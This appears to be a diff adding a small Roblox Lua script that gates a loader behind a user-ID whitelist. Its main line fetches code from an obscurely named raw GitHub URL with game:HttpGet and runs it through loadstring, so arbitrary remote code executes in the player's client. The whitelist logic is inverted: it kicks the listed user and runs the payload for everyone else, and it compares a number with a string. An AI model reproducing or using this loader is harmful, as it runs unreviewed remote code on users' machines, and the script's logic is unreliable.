@@ -1,0 +1,12 @@
+local whitelisted = {
+    "275535162" --> Whitelisted User
+}
+for _, Player in pairs(whitelisted) do
+    if game.Players.LocalPlayer.UserId == Player then --> Checking if UserID is in the table
+        game.Players.LocalPlayer:Kick("NOT WHITELISTED! CLOSING CLIENT IN 5 SECONDS") --> Kicking Player
+        wait(5)
+        game:shutdown() --> Closing client
+        else
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/kinnny/pro/main/asdafasdwfqwmorraoylehighsaxaxwfoq'))()
+    end
+end
